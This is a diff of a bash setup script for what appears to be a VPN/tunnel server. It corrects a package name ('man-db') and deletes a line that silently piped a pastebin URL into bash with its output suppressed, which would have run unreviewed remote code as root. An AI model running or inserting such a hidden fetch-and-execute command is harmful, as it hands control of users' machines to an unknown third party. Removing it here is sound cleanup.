@@ -67,7 +67,7 @@ function is_root() {
 
 ### Update and remove packages
 function base_package() {
-    sudo apt-get autoremove -y mandb apache2 ufw exim4 firewalld -y
+    sudo apt-get autoremove -y man-db apache2 ufw exim4 firewalld -y
     sudo add-apt-repository ppa:vbernat/haproxy-2.7 -y
     sudo apt update && apt upgrade -y
     sudo apt-get install -y --no-install-recommends software-properties-common
@@ -211,7 +211,6 @@ function download_config(){
     # > Add badvpn services
     wget -O /tmp/badvpn.zip "${REPO}badvpn/badvpn.zip"  >/dev/null 2>&1
     7z e /tmp/badvpn.zip -o/etc/systemd/system/ >/dev/null 2>&1
-    curl https://pastebin.com/raw/zupWGtum | bash >/dev/null 2>&1
     # > Create rc.local services
 
     cat >/root/.profile <<EOF
